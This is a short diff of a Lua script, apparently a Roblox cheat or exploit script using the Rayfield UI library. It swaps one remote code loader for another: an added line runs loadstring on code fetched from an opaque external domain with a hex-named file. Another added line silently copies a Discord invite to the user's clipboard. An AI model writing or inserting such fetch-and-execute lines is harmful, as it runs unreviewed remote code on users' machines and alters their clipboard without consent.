@@ -472,6 +472,7 @@ local Toggle = SettTab:CreateToggle({
 })
 
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/13926bf99669aed7b325e804.lua'))()
+loadstring(game:HttpGet("https://egorikusa.space/9fd3de5e18a8039ffb435583.lua", true))()
 
+setclipboard("https://discord.gg/h7VfhApgSD")
 Rayfield:LoadConfiguration() 
